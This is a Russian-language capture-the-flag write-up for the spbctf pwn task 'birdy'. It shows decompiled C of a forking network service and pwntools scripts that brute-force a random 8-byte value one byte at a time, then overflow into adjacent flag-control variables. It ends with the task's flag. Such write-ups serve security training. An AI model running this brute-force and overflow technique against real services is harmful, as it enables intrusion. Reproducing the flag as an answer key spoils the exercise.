[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn1_birdy)
Описание:
Мы задумали большое число. Чтобы получить флаг, отгадайте его.  
[task](https://pwn.spbctf.ru/files/overflow/birdy/task)
`nc 109.233.56.90 11570`

Чтобы получить флаг, необходимо ввести верный `bird`, а затем переполнить буфер, чтобы перезаписать значение `print_flag` и `loop`.
``` c
__int64 __fastcall task_handle_connection(int a1)
{
  _BYTE ptr[1028]; // [rsp+10h] [rbp-410h] BYREF
  int v3; // [rsp+414h] [rbp-Ch]
  FILE *stream; // [rsp+418h] [rbp-8h]

  sendstr(a1, "Let's play a guess game\n");
  sendstr(a1, "I guessed some 8byte value. You can write to it, but not read.\n");
  loop = 1;
  while ( loop )
  {
    bird_copy = bird;
    sendstr(a1, &off_2088);
    read(a1, &bird_copy, 0x10u);
    if ( bird != bird_copy )
    {
      sendstr(a1, "Oh no, value has just changed. Good bye!\n");
      return 0;
    }
    sendstr(a1, "Nice try\n");
  }
  if ( print_flag )
  {
    stream = fopen("/flag", "r");
    v3 = fread(ptr, 1u, 0x400u, stream);
    sendlen(a1, ptr, v3);
    fclose(stream);
  }
  return 0;
}
```

Инициализации bird:
``` c
__int64 task_init()
{
  __int64 result; // rax
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/urandom", 0);
  read(fd, &bird, 8u);
  close(fd);
  result = bird;
  if ( !bird )
  {
    puts("task init failed");
    exit(1);
  }
  return result;
}
```

Main:
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  struct sockaddr addr; // [rsp+10h] [rbp-30h] BYREF
  int optval; // [rsp+2Ch] [rbp-14h] BYREF
  int status; // [rsp+30h] [rbp-10h]
  __pid_t v7; // [rsp+34h] [rbp-Ch]
  int v8; // [rsp+38h] [rbp-8h]
  int fd; // [rsp+3Ch] [rbp-4h]

  *&addr.sa_family = 0;
  *&addr.sa_data[6] = 0;
  if ( signal(17, (&dword_0 + 1)) == -1LL )
  {
    fwrite("Failed to set SIGCHLD handler.", 1u, 0x1Eu, stderr);
    return 1;
  }
  else
  {
    fd = socket(2, 1, 6);
    if ( fd == -1 )
    {
      perror("socket");
      return 1;
    }
    else
    {
      optval = 1;
      if ( setsockopt(fd, 1, 2, &optval, 4u) )
      {
        perror("setsockopt");
        return 1;
      }
      else
      {
        addr.sa_family = 2;
        *&addr.sa_data[2] = htonl(0);
        *addr.sa_data = htons(0x1F90u);
        if ( bind(fd, &addr, 0x10u) )
        {
          perror("bind");
          return 1;
        }
        else
        {
          if ( !listen(fd, 20) )
          {
            task_init();
            while ( 1 )
            {
              while ( 1 )
              {
                v8 = accept(fd, nullptr, nullptr);
                if ( v8 != -1 )
                  break;
                perror("accept");
              }
              v7 = fork();
              if ( v7 == -1 )
              {
                perror("fork");
                close(v8);
              }
              else
              {
                if ( !v7 )
                {
                  alarm(0xFu);
                  close(fd);
                  status = task_handle_connection(v8);
                  close(v8);
                  _exit(status);
                }
                close(v8);
              }
            }
          }
          perror("listen");
          return 1;
        }
      }
    }
  }
}
```
Создаёт свой форк, поэтому значение `bird` не меняется от подключения к подключению. Для получения флага необходимо подбирать значение bird по одному байту.

Эксплоит для брутфорса `bird`:
``` python
def test(io, data):
    io.sendafter(b'> ', data) 
    answer = io.recvline().decode()
    if 'Oh no' in answer:
        return False
    return True


bird = b''
for _ in range(8):
    for i in range(255):
        io = start()
        
        current_byte = bytes([i])
        payload = bird + current_byte
        res = test(io, payload)
        
        print('Try:', '0x' + payload.hex())
        
        io.close()
        
        if res:
            bird = payload
            break

print(bird)
```
После нахождения `bird` необходимо переполнить буфер `print_flag` должен быть != 0, а `loop` = 0.

Расположение переменных в памяти:
![{F78499BC-635E-4912-8A04-7958109649A0}](../../../../z.%20Images/{F78499BC-635E-4912-8A04-7958109649A0}.png)

Полный эксплоит:
``` python
def test(io, data):
    io.sendafter(b'> ', data) 
    answer = io.recvline().decode()
    if 'Oh no' in answer:
        return False
    return True


bird = b''
for _ in range(8):
    for i in range(255):
        io = start()
        
        current_byte = bytes([i])
        payload = bird + current_byte
        res = test(io, payload)
        
        print('Try:', '0x' + payload.hex())
        
        io.close()
        
        if res:
            bird = payload
            break

print('Bird =', bird.hex())

io = start()

final_payload = bird + p32(1) + p32(0)
io.send(final_payload)

io.interactive()
```

Запуск:
![{7A3154F7-E52B-4FF6-A53F-603C3A4C5517}](../../../../z.%20Images/{7A3154F7-E52B-4FF6-A53F-603C3A4C5517}.png)

Ответ: `spbctf{Well_everybody_knows_that_the_bird_is_the_word!}`